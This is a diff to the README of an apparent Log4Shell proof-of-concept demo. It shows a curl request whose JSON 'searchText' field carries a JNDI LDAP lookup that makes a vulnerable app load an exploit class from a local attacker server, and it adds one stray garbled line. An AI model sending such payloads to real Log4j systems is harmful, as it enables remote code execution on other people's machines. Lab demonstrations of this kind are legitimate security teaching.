@@ -15,7 +15,7 @@ ANY DAMAGES CAUSED DUE TO ILLEGAL USE OF THIS APP/SOFTWARE/POC IS NOT THE RESPON
 ```
 ![Log4JShell POC](https://user-images.githubusercontent.com/1702155/148014657-408433e9-f6a5-40de-99b2-20bf6ce6bf8c.jpg)
 
-
+˚≠
 ## Pre-requisites
 * [Python 3](https://www.python.org/downloads/)
 * [Java 1.8](https://docs.oracle.com/javase/8/docs/technotes/guides/install/install_overview.html)
@@ -48,7 +48,7 @@ python3 src/main/python/attacker/ftp-server.py
 curl --location --request GET 'http://localhost:8080/log4jshell/search' \
 --header 'Content-Type: application/json' \
 --data-raw '{
-    "searchText" : "${jndi:ldap://localhost:8389/com.demo.exploit.log4jshell.Exploit.class}"
+    "searchText" : "${jndi:ldap://localhost:8389/com.demo.exploit.log4jshell.attacker.payload.Exploit.class}"
 }
 '
 ```
